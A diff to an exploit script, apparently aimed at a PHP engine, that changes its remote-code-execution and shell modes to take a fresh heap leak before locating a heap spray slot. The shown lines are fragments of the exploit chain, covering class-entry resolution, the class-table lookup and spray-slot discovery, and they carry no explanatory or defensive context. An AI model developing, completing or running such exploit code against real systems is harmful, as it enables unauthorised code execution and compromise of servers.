@@ -554,7 +554,7 @@ def mode_rce(t: Target, args):
         log("x", "R-5 stdClass ce not resolved")
         return 2
     log("+", f"R-5 stdClass ce :: 0x{ce_stdclass:x}")
-    spray_addr = chain.find_spray_slot(hr)
+    spray_addr = chain.find_spray_slot(heap_leak(t))  # FRESH leak
     if spray_addr is None:
         log("x", "R-6 spray slot not found")
         return 2
@@ -627,7 +627,7 @@ def mode_shell(t: Target, args):
     ce = chain.lookup_class_table(eg, 'stdclass')
     if ce is None:
         log("x", "R-5 ce"); return 2
-    S = chain.find_spray_slot(hr)
+    S = chain.find_spray_slot(heap_leak(t))  # FRESH leak: last spray's chunk
     if S is None:
         log("x", "R-6 spray"); return 2
     log("+", f"R-5/6 ce 0x{ce:x} S 0x{S:x}")
